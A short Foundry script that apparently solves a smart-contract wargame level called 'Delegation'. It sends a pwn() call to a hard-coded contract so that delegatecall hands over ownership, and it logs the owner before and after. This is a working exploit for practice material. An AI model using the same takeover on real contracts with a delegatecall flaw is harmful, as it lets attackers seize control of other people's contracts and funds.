pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/AttackDelegation.sol";

contract SolveDelegation is Script {

    function run() external {

        address target = 0x012d6bB6a7A8c4370BAA0cD13427C929731DbE12; 
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        console.log("Owner before: ", IDelegation(target).owner());
        (bool success,) = target.call(abi.encodeWithSignature("pwn()"));

        require(success, "call failed");

        console.log("Owner atfer: ", IDelegation(target).owner());

        vm.stopBroadcast();
    }
}